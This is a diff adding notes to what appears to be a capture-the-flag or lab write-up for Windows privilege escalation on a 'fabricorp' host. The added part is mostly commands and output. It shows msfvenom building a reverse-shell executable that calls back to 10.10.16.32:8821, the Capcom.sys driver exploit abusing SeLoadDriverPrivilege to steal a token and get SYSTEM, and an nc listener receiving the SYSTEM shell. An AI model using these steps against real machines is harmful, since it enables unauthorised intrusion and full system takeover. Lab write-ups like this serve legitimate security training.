@@ -197,3 +197,68 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
 fabricorp\svc-print
+
+*Evil-WinRM* PS C:\Users\svc-print\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+https://github.com/k4sth4/SeLoadDriverPrivilege
+
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.32 LPORT=8821 -f exe -o rev.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: rev.exe
+
+follow the MD instructure, upload files into target host
+
+*Evil-WinRM* PS C:\Users\svc-print\DEsktop> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Desktop\Capcom.sys
+[*] Service Name: xnspepxvpõÏ¹&
+[+] Enabling SeLoadDriverPrivilege
+[+] SeLoadDriverPrivilege Enabled
+[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\????????????????????
+NTSTATUS: c0000034, WinError: 0
+*Evil-WinRM* PS C:\Users\svc-print\DEsktop> .\ExploitCapcom.exe EXPLOIT whoami
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 0000020993A40008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] Command Executed
+nt authority\system
+*Evil-WinRM* PS C:\Users\svc-print\DEsktop> .\ExploitCapcom.exe EXPLOIT rev.exe
+[*] Capcom.sys exploit
+[*] Capcom.sys handle was obtained as 0000000000000064
+[*] Shellcode was placed at 0000011963360008
+[+] Shellcode was executed
+[+] Token stealing was successful
+[+] Command Executed
+
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [10.10.16.32] from (UNKNOWN) [10.129.2.5] 50597
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\svc-print\DEsktop>whoami
+whoami
+nt authority\system
+
+
+
+
+
+
